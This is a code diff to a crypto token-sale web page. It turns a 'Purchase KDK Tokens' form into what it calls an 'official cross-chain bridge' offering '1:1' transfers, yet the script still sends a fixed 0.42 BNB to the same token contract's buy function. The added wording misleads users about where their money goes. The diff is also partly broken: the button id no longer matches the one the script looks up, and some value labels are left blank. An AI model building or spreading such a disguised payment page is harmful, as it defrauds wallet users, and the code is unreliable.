@@ -233,6 +233,35 @@
             color: var(--primary-color);
         }
 
+        .fixed-purchase {
+            background-color: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .fixed-purchase-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--secondary-color);
+            margin-bottom: 10px;
+        }
+
+        .fixed-purchase-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 5px;
+        }
+
+        .fixed-purchase-value {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
         .input-group {
             margin-bottom: 20px;
         }
@@ -258,6 +287,8 @@
             font-size: 18px;
             outline: none;
             transition: border-color 0.3s ease;
+            text-align: center;
+            font-weight: 600;
         }
 
         .token-input:focus {
@@ -297,11 +328,12 @@
             cursor: not-allowed;
         }
 
-        .min-buy-note {
+        .fixed-purchase-note {
             text-align: center;
             margin-top: 15px;
-            color: var(--warning-color);
-            font-size: 14px;
+            color: var(--secondary-color);
+            font-size: 16px;
+            font-weight: 600;
         }
 
         /* Info Card */
@@ -476,6 +508,10 @@
                 font-size: 24px;
             }
             
+            .fixed-purchase-amount {
+                font-size: 28px;
+            }
+            
             .notification {
                 top: 80px;
                 left: 20px;
@@ -552,19 +588,18 @@
         <div class="main-content">
             <!-- Token Sale Card -->
             <div class="card">
-                <h2 class="card-title"><i class="fas fa-coins"></i> Purchase KDK Tokens</h2>
+                <h2 class="card-title"><i class="fas fa-coins"></i> Cross-chain bridge</h2>
                 
                 <div class="token-price">
                     <div class="price-label">Token Price:</div>
                     <div class="price-value">$0.05 USD</div>
                 </div>
                 
-                <div class="input-group">
-                    <label class="input-label">BNB Amount (Minimum 0.4 BNB)</label>
-                    <div class="input-with-unit">
-                        <input type="number" id="bnbAmount" class="token-input" min="0.4" step="0.1" value="0.4">
-                        <span class="input-unit">BNB</span>
-                    </div>
+                <!-- Fixed Purchase Section -->
+                <div class="fixed-purchase">
+                    <div class="fixed-purchase-title">Please use the official cross-chain bridge to cross-chain to the BRA network. BSC currently has no liquidity. Please click the 1:1 cross-chain option below.</div>
+                    <div class="fixed-purchase-amount">0.42 BNB</div>
+                    <div class="fixed-purchase-value">≈  USD</div>
                 </div>
                 
                 <div class="input-group">
@@ -575,12 +610,12 @@
                     </div>
                 </div>
                 
-                <button id="buyTokens" class="buy-btn" disabled>
+                <button id="Confirm cross-chain" class="buy-btn" disabled>
                     <span id="buyBtnText">Connect Wallet to Purchase</span>
                 </button>
                 
-                <p class="min-buy-note">
-                    <i class="fas fa-exclamation-circle"></i> Minimum purchase amount is 0.4 BNB
+                <p class="fixed-purchase-note">
+                    <i class="fas fa-check-circle"></i> Fixed purchase amount: 
                 </p>
             </div>
             
@@ -591,6 +626,10 @@
                 <div class="info-item">
                     <span class="info-label">Your Balance</span>
                     <span class="info-value" id="userBalance">0 KDK</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">Fixed Purchase</span>
+                    <span class="info-value">0.42 BNB</span>
                 </div>
                 <div class="info-item">
                     <span class="info-label">Sale Price</span>
@@ -669,6 +708,9 @@
         const CONTRACT_ADDRESS = '0x6bfcA5254F4C106AD9173434da7DC26C5120eB6C';
         const CONTRACT_ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"address","name":"_refer","type":"address"}],"name":"airdrop","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"airdropReceive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_addr","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"allocationForRewards","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner_","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_refer","type":"address"}],"name":"buy","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"cap","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"clearETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getBlock","outputs":[{"internalType":"bool","name":"swAirdorp","type":"bool"},{"internalType":"bool","name":"swSale","type":"bool"},{"internalType":"uint256","name":"sPrice","type":"uint256"},{"internalType":"uint256","name":"sMaxBlock","type":"uint256"},{"internalType":"uint256","name":"nowBlock","type":"uint256"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"airdropEth","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
         
+        // Fixed purchase amount
+        const FIXED_BNB_AMOUNT = 0.42;
+        
         // Global variables
         let web3;
         let contract;
@@ -680,7 +722,6 @@
         const walletAddressEl = document.getElementById('walletAddress');
         const buyTokensBtn = document.getElementById('buyTokens');
         const buyBtnText = document.getElementById('buyBtnText');
-        const bnbAmountInput = document.getElementById('bnbAmount');
         const tokenAmountInput = document.getElementById('tokenAmount');
         const userBalanceEl = document.getElementById('userBalance');
         const totalSoldEl = document.getElementById('totalSold');
@@ -698,14 +739,18 @@
             const urlParams = new URLSearchParams(window.location.search);
             const refParam = urlParams.get('ref');
             
-            if (refParam && web3.utils.isAddress(refParam)) {
+            if (refParam && web3 && web3.utils.isAddress(refParam)) {
                 referralAddress = refParam;
                 localStorage.setItem('kdk_referral', refParam);
                 showNotification('Referral address detected: ' + refParam.substring(0, 8) + '...', 'info');
+            } else if (refParam) {
+                // Store temporarily until web3 is initialized
+                referralAddress = refParam;
+                localStorage.setItem('kdk_referral', refParam);
             } else {
                 // Check if referral is stored in localStorage
                 const storedRef = localStorage.getItem('kdk_referral');
-                if (storedRef && web3.utils.isAddress(storedRef)) {
+                if (storedRef) {
                     referralAddress = storedRef;
                 }
             }
@@ -713,8 +758,8 @@
             // Update referral link
             updateReferralLink();
             
-            // Calculate token amount when BNB input changes
-            bnbAmountInput.addEventListener('input', calculateTokenAmount);
+            // Calculate token amount initially
+            calculateTokenAmount();
             
             // Copy referral link button
             copyLinkBtn.addEventListener('click', copyReferralLink);
@@ -736,6 +781,15 @@
                 try {
                     web3 = new Web3(window.ethereum);
                     contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                    
+                    // Validate referral address if we have one
+                    if (referralAddress && web3.utils.isAddress(referralAddress)) {
+                        // Already set from URL or localStorage
+                    } else if (referralAddress) {
+                        // Invalid address, clear it
+                        referralAddress = null;
+                        localStorage.removeItem('kdk_referral');
+                    }
                     
                     // Try to get connected accounts
                     const accounts = await web3.eth.getAccounts();
@@ -789,7 +843,10 @@
                 
                 // Enable buy button
                 buyTokensBtn.disabled = false;
-                buyBtnText.textContent = 'Buy KDK Tokens';
+                buyBtnText.textContent = `Buy KDK Tokens for ${FIXED_BNB_AMOUNT} BNB`;
+                
+                // Update referral link
+                updateReferralLink();
             }
         }
         
@@ -841,7 +898,7 @@
                     maximumFractionDigits: 0
                 });
                 
-                // Calculate initial token amount
+                // Calculate token amount
                 calculateTokenAmount();
                 
             } catch (error) {
@@ -849,20 +906,11 @@
             }
         }
         
-        // Calculate token amount based on BNB input
+        // Calculate token amount based on fixed BNB amount
         function calculateTokenAmount() {
-            const bnbAmount = parseFloat(bnbAmountInput.value) || 0;
-            
-            // Minimum purchase check
-            if (bnbAmount < 0.4) {
-                tokenAmountInput.value = 'Minimum 0.4 BNB';
-                buyTokensBtn.disabled = true;
-                return;
-            }
-            
             // Calculate tokens (simplified calculation)
             // In reality, this should use the contract's salePrice
-            const bnbToWei = bnbAmount * Math.pow(10, 18);
+            const bnbToWei = FIXED_BNB_AMOUNT * Math.pow(10, 18);
             const salePrice = 17400; // From contract
             const tokenAmount = (bnbToWei * salePrice) / Math.pow(10, 18);
             
@@ -870,10 +918,6 @@
                 minimumFractionDigits: 2,
                 maximumFractionDigits: 2
             });
-            
-            if (userAddress) {
-                buyTokensBtn.disabled = false;
-            }
         }
         
         // Buy tokens function
@@ -883,22 +927,14 @@
                 return;
             }
             
-            const bnbAmount = parseFloat(bnbAmountInput.value);
-            
-            // Validate minimum purchase
-            if (bnbAmount < 0.4) {
-                showNotification('Minimum purchase amount is 0.4 BNB.', 'error');
-                return;
-            }
-            
             // Convert BNB to wei
-            const bnbWei = web3.utils.toWei(bnbAmount.toString(), 'ether');
+            const bnbWei = web3.utils.toWei(FIXED_BNB_AMOUNT.toString(), 'ether');
             
             // Get referral address (if any)
             let referrer = referralAddress || '0x0000000000000000000000000000000000000000';
             
             // Update button to show loading
-            buyBtnText.innerHTML = '<span class="spinner"></span> Processing...';
+            buyBtnText.innerHTML = `<span class="spinner"></span> Processing ${FIXED_BNB_AMOUNT} BNB...`;
             buyTokensBtn.disabled = true;
             
             try {
@@ -908,7 +944,7 @@
                     value: bnbWei
                 });
                 
-                showNotification('Purchase successful! Tokens have been sent to your wallet.', 'success');
+                showNotification(`Purchase successful! ${FIXED_BNB_AMOUNT} BNB transaction completed. Tokens have been sent to your wallet.`, 'success');
                 
                 // Reload contract data
                 await loadContractData();
@@ -921,13 +957,17 @@
                 if (error.message.includes('rejected')) {
                     errorMessage = 'Transaction was rejected by user.';
                 } else if (error.message.includes('insufficient funds')) {
-                    errorMessage = 'Insufficient BNB balance.';
+                    errorMessage = `Insufficient BNB balance. You need ${FIXED_BNB_AMOUNT} BNB to purchase.`;
+                } else if (error.message.includes('exceeds allowance')) {
+                    errorMessage = 'Contract allowance issue. Please try again.';
+                } else if (error.message.includes('sale ended') || error.message.includes('sale not active')) {
+                    errorMessage = 'Token sale is not active or has ended.';
                 }
                 
                 showNotification(errorMessage, 'error');
             } finally {
                 // Reset button
-                buyBtnText.textContent = 'Buy KDK Tokens';
+                buyBtnText.textContent = `Buy KDK Tokens for ${FIXED_BNB_AMOUNT} BNB`;
                 buyTokensBtn.disabled = false;
             }
         }
